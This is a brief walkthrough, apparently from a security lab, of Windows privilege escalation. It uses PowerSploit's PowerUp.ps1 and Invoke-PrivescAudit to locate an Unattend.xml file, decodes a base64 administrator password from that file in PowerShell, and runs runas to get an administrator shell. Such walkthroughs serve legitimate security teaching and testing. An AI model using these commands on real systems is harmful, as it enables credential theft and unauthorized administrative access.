We will run the powerup.ps1 Powershell script to find privilege escalation vulnerability. 
- Powershell.exe
- cd .\Desktop\PowerSploit\Privesc\
- ls
Now, we will Import PowerUp.ps1 script and Invoke-PrivescAudit function.
- . .\PowerUp.ps1
- Invoke-PrivescAudit
By importing the PowerUp.ps1 script and running the Invoke-PrivescAudit function, the user is essentially performing a comprehensive scan for potential privilege 
escalation vulnerabilities on the target system. This can be a valuable step in identifying and remediating security risks that could be exploited by attackers.
  
In this case, the ouput pointed towards the Unattend.xml. 
An Unattend.xml file, also known as an answer file, is an XML file that contains settings that can be used to automate the Windows installation process.
We will look through this file in hopes of finding the passowrd and user account. 
-type unattend.xml

In this case, we found the username was administrator, and the passowrd was encoded in base64 QWRtaW5AMTIz.

Decoding administrator password using Powershell.
-$password='QWRtaW5AMTIz'
-$password=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($pa
ssword))
-echo $password

The password is Admin@123

Now, to run powershell as admin, we run this command
-runas.exe /user:administrator cmd
